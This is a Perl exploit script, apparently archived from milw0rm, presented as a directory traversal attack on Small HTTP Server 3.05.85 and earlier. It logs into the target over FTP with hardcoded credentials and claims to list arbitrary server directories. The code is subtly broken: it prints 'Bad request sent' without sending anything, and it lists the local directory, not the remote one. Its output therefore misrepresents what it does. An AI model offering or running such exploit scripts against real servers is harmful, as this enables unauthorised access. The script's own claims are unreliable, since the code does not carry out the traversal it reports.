<html><head><title>Small HTTP Server <= 3.05.85 Directory Traversal Exploit</title></head><pre>#!/usr/bin/perl
#
# Author : Houssamix

# Small HTTP Server &lt;= 3.05.85 Directory Traversal Exploit

# Description : Any user FTP with low permission can have access to any directory in server

# Downlod : http://smallsrv.com/
# [01.01.09] Happy new year! Version 3.05.84

# Greetz to Legend-Spy , Stack , Snakespc , str0ke &amp; .. 

use LWP;
use Net::FTP;
use IO::Dir;  
use Tk;

if(@ARGV!=2){
    print &quot;Author : Houssamix \n&quot;;
    print &quot;Small HTTP Server &lt;= 3.05.85 Directory Traversal Exploit\n&quot;;
    print &quot;Usage: Hsmx.pl IP [dir_path] \n&quot;;
    print &quot;Exam: Hsmx.pl 127.0.0.1 c:\\ \n\n&quot;;
    exit;
}

$ip = $ARGV[0];
$path = $ARGV[1];

my $username = &quot;houssamix&quot;; 
my $pass = &quot;123456&quot;; 
system(&quot;color f&quot;);

print &quot;\n\n&quot;; 
print &quot;[+] Author : Houssamix\n&quot;; 
print &quot;[+] Small HTTP Server &lt;= 3.05.85 Directory Traversal Exploit\n&quot;; 
print &quot;[+] Connect to $ip ...\n&quot;; 
sleep(1);
$ftp = Net::FTP-&gt;new($ip, Debug =&gt; 0, Port =&gt; 21) || die &quot;could not 
connect: $!&quot;;

print &quot;[+] Send user and pass..\n&quot;;

$ftp-&gt;login($username, $pass) || die &quot;could not login: $!&quot;; 
sleep(1);

print &quot;[+] Logged in\n&quot;;
print &quot;[+] Bad request sent \n\n&quot;;
sleep(1);

tie %dir, IO::Dir, $path;
foreach (keys %dir) {
print  $_, &quot; =&gt; &quot; , $dir{$_}-&gt;size, &quot;\n&quot;;
}

$ftp-&gt;quit;  

# milw0rm.com [2009-02-02]</pre></html>